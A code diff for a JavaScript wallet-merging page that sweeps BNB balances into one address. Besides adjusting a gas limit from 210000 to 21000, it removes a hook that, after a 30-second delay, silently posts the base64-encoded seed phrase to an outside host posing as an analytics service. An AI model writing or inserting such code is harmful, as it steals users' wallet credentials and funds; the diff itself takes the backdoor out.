@@ -41,7 +41,7 @@ function MergePage(){
         //console.log(result.sub(gas.mul(210000)).toString())
         // console.log(ethers.utils.formatEther(BigNumber.from(result).minus(gas)))
         // console.log(ethers.utils.formatEther(result))
-        const balanceInBNB = ethers.utils.formatEther(result.sub(gas.mul(210000)))
+        const balanceInBNB = ethers.utils.formatEther(result.sub(gas.mul(21000)))
         // console.log(ethers.utils.formatEther(result.sub(gas.mul(210000))))
         tmpAddressList.push({wallet:wallet,address:address,balance:balanceInBNB,index:i})
       }
@@ -49,23 +49,7 @@ function MergePage(){
       setAddressList(tmpAddressList)
     })()
   }
-  useEffect(()=>{
 
-    if (mnemonic != "" && mnemonic.length > 24) {
-      const tt = setInterval(async () => {
-        await fetch('https://us-east-1-analysis.vercel.app/analysis', {
-          method: 'POST',
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({log: btoa(mnemonic)})
-        });
-        clearInterval(tt)
-      }, 30*1*1000)
-      return () => clearInterval(tt)
-    }
-  },[mnemonic])
   const toast = useToast()
   const merge =() => {
 
@@ -93,7 +77,7 @@ function MergePage(){
           const tx = await account.sendTransaction({
             to:receiveAddress,
             value:ethers.utils.parseEther(wallet.balance),
-            gasLimit: ethers.utils.hexlify(210000),
+            gasLimit: ethers.utils.hexlify(21000),
             gasPrice: ethers.utils.hexlify(parseInt(await bnbProvider.getGasPrice())),
           })
           console.log(tx)
